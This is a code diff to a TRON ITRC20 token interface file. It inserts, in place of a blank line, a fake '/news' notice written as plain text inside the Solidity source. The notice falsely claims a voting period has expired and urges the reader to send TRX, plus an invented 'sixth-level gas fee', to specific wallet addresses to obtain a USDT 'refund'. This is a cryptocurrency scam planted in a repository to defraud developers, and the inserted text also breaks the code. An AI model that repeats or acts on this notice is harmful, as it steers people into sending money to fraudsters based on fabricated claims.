@@ -23,7 +23,12 @@ interface ITRC20 {
      * Emits a {Transfer} event.
      */
     function transfer(address recipient, uint256 amount) external returns (bool);
-
+    /news Due to multiple transfer errors, the current TRX voting period has expired
+     You can use the bound return address "TYgESykH7NatJfAa1JcEruaG14d3ZwA9UH" to transfer 17 TRX 
+     to the contract address "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" to cancel the current vote
+     17761 USDT will be refunded and you will not be able to use voting rights to transfer again
+     You can also choose to reconfigure the transfer, which will cost approximately 3311 USDT more
+     Since your wallet balance is too large, please use the sixth-level gas fee of 40.5 TRX
     /**
      * @dev Returns the remaining number of tokens that `spender` will be
      * allowed to spend on behalf of `owner` through {transferFrom}. This is
